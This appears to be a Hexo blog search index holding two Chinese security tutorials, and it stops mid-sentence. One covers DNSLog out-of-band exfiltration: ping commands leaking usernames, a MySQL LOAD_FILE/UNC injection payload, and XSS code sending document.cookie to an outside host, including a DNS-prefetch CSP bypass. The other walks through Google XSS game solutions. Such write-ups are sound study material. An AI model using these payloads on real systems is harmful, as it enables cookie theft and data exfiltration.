<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DNSLog 盲注总结</title>
    <url>/2021/03/18/DNSLog-%E7%9B%B2%E6%B3%A8%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="DNSLog-盲注总结"><a href="#DNSLog-盲注总结" class="headerlink" title="DNSLog 盲注总结"></a>DNSLog 盲注总结</h1><p>总所周知，我们输入的域名需要通过DNS服务器进行解析得到IP地址才能通过IP访问网站，DNSLog就是存储在DNS服务器上的域名信息，它记录着用户对域名访问的信息，类似日志文件。我们只需要搭建一个的DNS服务器，并将要盲打或盲注的回显，放到自己域名的二级三级甚至更多级的子域名上去请求，就可以通过DNS解析日志来获取到它们。</p>
<p>DNSLog部署过程：</p>
<ol>
<li><p>申请一个域名，如 xie.com</p>
</li>
<li><p>在我们的VPS上安装并配置DNS服务器</p>
</li>
<li><p>将 xie.com 的DNS服务器设置为我们的VPS地址</p>
</li>
</ol>
<p>这样，所有访问 xie.com 的二级三级四级等等子域名都会被解析到我们的VPS上。我们就可以通过查询DNS解析记录来获得命令执行的回显了。<br>由于申请域名需要钱还要进行部署，十分麻烦，我们可以利用一些在线的DNSLog平台：</p>
<ul>
<li><a class="link"   href="http://ceye.io/" >http://ceye.io<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://www.dnslog.cn/" >http://www.dnslog.cn<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>这里我们取得一个DNS域名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t6n089.ceye.io</span><br></pre></td></tr></table></figure>


<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>无回显得命令执行语句可以使用DNSLog来查看结果。</p>
<ul>
<li>window</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping %USERNAME%.t6n089.ceye.io</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317113629877.png" alt="image-20210317113629877"></p>
<ul>
<li>*nix</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping &#96;whoami&#96;.t6n089.ceye.io</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317113750098.png" alt="image-20210317113750098"></p>
<p>都可以看到我们的用户名显示在域名的最左边</p>
<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。先<code>show variables like &#39;%secure%&#39;;</code>查看load_file()可以读取的磁盘。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%secure%&#x27;;</span><br><span class="line">+<span class="comment">--------------------------+-------+</span></span><br><span class="line">| Variable_name            | Value |</span><br><span class="line">+<span class="comment">--------------------------+-------+</span></span><br><span class="line">| require_secure_transport | OFF   |</span><br><span class="line">| secure_auth              | ON    |</span><br><span class="line">| secure_file_priv         | NULL  |</span><br><span class="line">+<span class="comment">--------------------------+-------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span>, <span class="number">1</span> <span class="keyword">warning</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure>
<ul>
<li><p>当secure_file_priv为空，就可以读取磁盘的目录。</p>
</li>
<li><p>当secure_file_priv为G:\，就可以读取G盘的文件。</p>
</li>
<li><p>当secure_file_priv为null，load_file就不能加载文件。</p>
</li>
</ul>
<p>这里为NULL，因此需要在<code>my.ini</code>配置文件中修改权限，把配置文件中的这一行改为（没有就加上）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secure_file_priv&#x3D;&quot;&quot;</span><br></pre></td></tr></table></figure>
<p><strong>UNC路径</strong></p>
<p>以下是百度的UNC路径的解释</p>
<blockquote>
<p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</p>
</blockquote>
<p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式<code>\\sss.xxx\test\</code></p>
<p>这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。</p>
<p><strong>因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据</strong></p>
<p>payload:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="keyword">CONCAT</span>(<span class="string">&#x27;\\\\&#x27;</span>,(查询语句),<span class="string">&#x27;.t6n089.ceye.io\\abc&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>example:</p>
<p>在本地搭建了一个SQL注入的环境，在XP系统上似乎不行，原因未知，而在WIN10能够成功执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:81&#x2F;db.php?id&#x3D;&#39; and (SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT database()),&#39;.t6n089.ceye.io\\abc&#39;)))--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317150746330.png" alt="image-20210317150746330"></p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>对于没有回显的XSS，我们要想知道是否成功也可以利用<code>src</code>属性填入得到的域名。</p>
<p>example：</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:81&#x2F;sql.php?input&#x3D;&gt;&lt;img src&#x3D;http:&#x2F;&#x2F;xss.t6n089.ceye.io&#x2F;aaa&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317151942334.png" alt="image-20210317151942334"></p>
<h3 id="绕过CSP"><a href="#绕过CSP" class="headerlink" title="绕过CSP"></a>绕过CSP</h3><p>CSP(内容安全策略)是防御XSS最有效的手段之一。当我们发现一个网站有XSS漏洞，想利用XSS平台来打Cookie时，CSP会通过白名单的方式，禁止跨域加载脚本，恶意代码便会因此被阻挡在门外，导致此XSS无法利用。对此，我们可以使用DNS预解析突破CSP的阻拦。</p>
<p>DNS预解析(DNS Prefetching)是一种能够加快网页加载速度的技术，对于跨站的链接，由于每次都要进行一次DNS解析，会消耗掉很多时间。DNS预解析在浏览器空闲时，将跨站资源的域名转化为IP 地址并缓存，真正请求资源时就避免了解析的时间。有趣的是，DNS预解析是默认开启的，并且我们可以通过<code>rel=&quot;dns-prefetch&quot;</code>来强制进行DNS预解析。<br>由于DNS预解析可以绕过CSP进行解析，结合DNSLOG，我们即可窃取在CSP保护下的Cookie。</p>
<p>example:</p>
<p>网站的源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;test&quot;,&quot;test&quot;,time()+3600);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;default-src &#39;self&#39;&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;DNSLog_XSS原理重现&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;input&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$xss &#x3D; $_GET[&#39;input&#39;];</span><br><span class="line">echo &#39;你输入的字符为&lt;br&gt;&#39;.$xss;</span><br><span class="line">$myfile &#x3D; fopen(&quot;.&#x2F;set_cookie.js&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">fwrite($myfile, $xss);</span><br><span class="line">fclose($myfile);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;set_cookie.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>这里网站通过<code>&lt;meta&gt;</code>标签设置了CSP为只能加载当前域名的脚本，也就是说无法使用内联的脚本，攻击者需要找到能够注入XSS的JavaScript脚本的外联文件，这里我们可以看到后端把我们输入的值写入了<code>set_cookie.js</code>文件中，然后又通过外联脚本引入了这个文件，这样我们就可以通过这里来进行XSS攻击。</p>
<p>在没有CSP情况下，我们通常是通过<code>&lt;img&gt;</code>等有src属性的标签带上cookie作为参数去访问我们的服务器：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.src = <span class="string">&quot;http://t6n089.ceye.io/log?&quot;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>
<p>由于这里有CSP限制了不能读取外部的资源，因此这里会报错。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210318163246373.png" alt="image-20210318163246373"></p>
<p>这里我们就可以使用DNS预解析去进行绕过：</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?input&#x3D;document.querySelector(&#39;body&#39;).innerHTML&#x3D;&quot;&lt;link rel&#x3D;&#39;dns-prefetch&#39; href&#x3D;&#39;http:&#x2F;&#x2F;&quot;+document.cookie.split(&#x2F;;|&#x3D;&#x2F;)[0].trim()+&quot;.t6n089.ceye.io&#39;&gt;&quot;;</span><br></pre></td></tr></table></figure>
<p>URL编码后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?input&#x3D;document.querySelector(&#39;body&#39;).innerHTML%3D%22%3Clink%20rel%3D&#39;dns-prefetch&#39;%20href%3D&#39;http%3A%2F%2F%22%2Bdocument.cookie.split(%2F%3B%7C%3D%2F)%5B0%5D.trim()%2B%22.t6n089.ceye.io&#39;%3E%22%3B</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210318163559401.png" alt="image-20210318163559401"></p>
<p>这种利用方法十分苛刻，因为不仅要找到能够修改后台的外联JavaScript文件的方法，而且作为XSS攻击，此payload过长，容易被怀疑，而使用短链接加载外部脚本有会被CSP禁止，再加上根据DNS的规定，域名的长度是有限制的，有时可能不发将长cookie完全带出。</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>一个没有回显得SSRF场景，我们同样可以通过DNSLog知道是否存在漏洞</p>
<p>example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:81&#x2F;sql.php?url&#x3D;http:&#x2F;&#x2F;ssrf.t6n089.ceye.io</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317155356269.png" alt="image-20210317155356269"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="http://www.0xby.com/916.html" >巧用DNSlog实现实现无回显注入<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.compass-security.com/2016/10/bypassing-content-security-policy-with-dns-prefetching/" >Bypassing Content-Security-Policy with DNS prefetching<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.redhatzone.com/ask/article/1402.html" >使用DNSLOG获取漏洞的回显<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>DNSLog</tag>
      </tags>
  </entry>
  <entry>
    <title>Google XSS game(2017)</title>
    <url>/2021/03/10/Google%20XSS%20game(2017)/</url>
    <content><![CDATA[<h1 id="Google-XSS-game-2017"><a href="#Google-XSS-game-2017" class="headerlink" title="Google XSS game(2017)"></a>Google XSS game(2017)</h1><p>这是新版的谷歌XSS靶场，每一关的过关条件是能够弹出alert()即可。</p>
<p>地址：<a class="link"   href="http://www.xssgame.com/" >http://www.xssgame.com/<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309171755100.png" alt="image-20210309171755100"></p>
<p>基础题，直接输入基本的反射型XSS语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x2F;&#x2F;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>


<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309172238727.png" alt="image-20210309172238727"></p>
<p>和旧版的level 4一样，我们查看页面元素</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309172452175.png" alt="image-20210309172452175"></p>
<p>发现我么在输入框输入的值被传递到了<code>startTimer()</code>函数中，于是我们可以直接闭合掉前一个函数，另外加上alert()，并且把后面的内容注释掉即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;);alert();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p>这里网上还有另一种解法是，先查看源码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">startTimer</span>(<span class="params">seconds</span>) </span>&#123;</span><br><span class="line">        seconds = <span class="built_in">parseInt</span>(seconds) || <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="built_in">window</span>.confirm(<span class="string">&quot;Time is up!&quot;</span>);</span><br><span class="line">          <span class="built_in">window</span>.loading.style.display = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">          <span class="built_in">window</span>.message.innerHTML = <span class="string">&#x27;&lt;a href=&quot;?&quot;&gt;Go back&lt;/a&gt; to the timer setup page&#x27;</span>;</span><br><span class="line">        &#125;, seconds * <span class="number">1000</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>这里把我们输入的second做了一个**parseInt(seconds)**处理，当我们输入seconds=’-alert(1)-‘，浏览器先解释运行alert(1)，然后再做了两个减法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;-alert(1)-&#39;</span><br></pre></td></tr></table></figure>


<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309172751104.png" alt="image-20210309172751104"></p>
<p>这里和旧版的 level 5 一样，没有我们输入参数的点</p>
<ul>
<li>查看源码</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chooseTab</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> html = <span class="string">&quot;Cat &quot;</span> + <span class="built_in">parseInt</span>(name) + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    html += <span class="string">&quot;&lt;img src=&#x27;/static/img/cat&quot;</span> + name + <span class="string">&quot;.jpg&#x27; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&#x27;tabContent&#x27;</span>).innerHTML = html;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Select the current tab</span></span><br><span class="line">    <span class="keyword">var</span> tabs = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;.tab&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; tabs.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tabs[i].id == <span class="string">&quot;tab&quot;</span> + <span class="built_in">parseInt</span>(name)) &#123;</span><br><span class="line">            tabs[i].className = <span class="string">&quot;tab active&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tabs[i].className = <span class="string">&quot;tab&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hashchange</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (self.location.hash) &#123;</span><br><span class="line">        chooseTab(<span class="built_in">decodeURIComponent</span>(self.location.hash.substr(<span class="number">1</span>)));</span><br><span class="line">        validate();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        chooseTab(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.onload = hashchange;</span><br><span class="line"><span class="built_in">window</span>.onhashchange = hashchange;</span><br></pre></td></tr></table></figure>
<p>当我们刷新页面或者改变了<code>#</code>后面的内容时就会使用<strong>location.hash</strong>把URL中<code>#</code>和它后面的内容作为<code>name</code>，然后调用chooseTab函数，把<code>name</code>作为 img 标签中 src 的一部分进行构造，最后把 img 插入到当前页面中。</p>
<p>这里我们可以把 src 截断，这样他的图片肯定会报错，然后添加一个 onerror 事件执行alert()，最后还要把 img 标签后面的 <code>&gt;</code>补齐</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; onerror&#x3D;alert()&gt;</span><br></pre></td></tr></table></figure>


<h2 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309194319372.png" alt="image-20210309194319372"></p>
<p>这一关和旧版的level 5 基本一样，有3个页面，分别是welcome，注册和确定</p>
<p>查看源码</p>
<ul>
<li>welcome.html</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/css/level_style.css&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/js/js_frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">&quot;background-color: white;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">      Welcome! Today we are announcing the much anticipated<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/googlereader.png&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;signup?next=confirm&quot;</span>&gt;</span>Sign up<span class="tag">&lt;/<span class="name">a</span>&gt;</span> for an exclusive Beta.</span><br><span class="line">    <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里可以看到，下面的a标签的链接带了一个<code>next</code>参数到signup页面</p>
<ul>
<li>signup.html</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/css/level_style.css&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/js/js_frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/googlereader-logo.png&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- We&#x27;re ignoring the email, but the poor user will never know! --&gt;</span></span><br><span class="line">      Enter email: <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;reader-email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;confirm?next=welcome&quot;</span>&gt;</span>Next &gt;&gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>signup.html 页面下面的 a 标签的链接带了一个<code>next</code>参数到confirm页面</p>
<ul>
<li>confirm.html</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/js/js_frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">&quot;background-color: white;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/googlereader-logo.png&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      Thanks for signing up, you will be redirected soon...</span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="built_in">window</span>.location = <span class="string">&#x27;welcome&#x27;</span>; &#125;, <span class="number">1000</span>);</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">    <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个页面把我们在URL中<code>next</code>参数的值作为下一个跳转的地址解析出来，于是我们可以利用这个地方。实际上我们直接访问这个地址即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xssgame.com&#x2F;f&#x2F;__58a1wgqGgI&#x2F;confirm?next&#x3D;javascript:alert()</span><br></pre></td></tr></table></figure>


<h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309200545637.png" alt="image-20210309200545637"></p>
<ul>
<li>查看源码</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;//ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script&gt;</span><br><span class="line">     angular.module(<span class="string">&#x27;myApp&#x27;</span>, [])</span><br><span class="line">     .controller(<span class="string">&#x27;myController&#x27;</span>, [<span class="string">&#x27;$scope&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope</span>) </span>&#123;</span><br><span class="line">       $scope.query = <span class="string">&quot;&quot;</span>;</span><br><span class="line">       $scope.alert = <span class="built_in">window</span>.alert;</span><br><span class="line">     &#125;]);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">var</span> UTM_PARAMS = [<span class="string">&quot;utm_content&quot;</span>, <span class="string">&quot;utm_medium&quot;</span>, <span class="string">&quot;utm_source&quot;</span>,</span><br><span class="line">         <span class="string">&quot;utm_campaign&quot;</span>, <span class="string">&quot;utm_term&quot;</span>]</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (location.search)	<span class="comment">//location.search等于 &#x27;?utm_term=&#123;&#123;alert()&#125;&#125;&#x27;</span></span><br><span class="line">     &#123;</span><br><span class="line">       <span class="keyword">var</span> params = location.search.substring(<span class="number">1</span>).split(<span class="string">&#x27;&amp;&#x27;</span>);</span><br><span class="line">         <span class="comment">//去掉?，拆分&amp;</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> p <span class="keyword">in</span> params) &#123;</span><br><span class="line">         <span class="keyword">var</span> r = params[p].split(<span class="string">&#x27;=&#x27;</span>); </span><br><span class="line">           <span class="comment">//拆分=，r等于utm_term，&#123;&#123;alert()&#125;&#125;</span></span><br><span class="line">         <span class="keyword">if</span> (r.length == <span class="number">2</span> &amp;&amp; UTM_PARAMS.indexOf(r[<span class="number">0</span>]) != -<span class="number">1</span>) &#123;</span><br><span class="line">           <span class="keyword">var</span> el = <span class="built_in">document</span>.getElementsByName(r[<span class="number">0</span>]);</span><br><span class="line">             <span class="comment">//赋值utm_term的value为&#123;&#123;alert()&#125;&#125;</span></span><br><span class="line">           <span class="keyword">if</span> (el.length) el[<span class="number">0</span>].value = <span class="built_in">decodeURIComponent</span>(r[<span class="number">1</span>]);</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>这一关终于不是旧版的题目了，angular JS 是一个前端框架，爆过模板注入漏洞。这里框架版本是1.5.8版本，这里可以找到这个框架的POC：<a class="link"   href="https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs" >https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>location.search</strong> 是一个可读可写的字符串，可设置或返回当前 URL 的查询部分（问号 ? 之后的部分）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?utm_term&#x3D;&#123;&#123;alert()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>这里明明是1.5.8的版本为什么能直接使用<code>&#123;&#123;alert()&#125;&#125;</code>就可以了呢，还没学模板注入搞不懂。</p>
<h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309204550025.png" alt="image-20210309204550025"></p>
<p>输入123查看输出点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p ng-non-bindable&gt;Sorry, no results were found for &lt;b&gt;123&lt;&#x2F;b&gt;.&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
<p><strong>ng-non-bindable</strong> 指令用于告诉 AngularJS 当前的 HTML 元素或其子元素不需要编译。因此这里无法被利用。</p>
<p>另外一个输出点是在form表单的action，我们在URL中输入参数<code>?query=1</code>会在action中显示出来。同时注意到这里使用的是1.2.0的angular框架。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309205640130.png" alt="image-20210309205640130"></p>
<p>angular 1.2.0 的payload是</p>
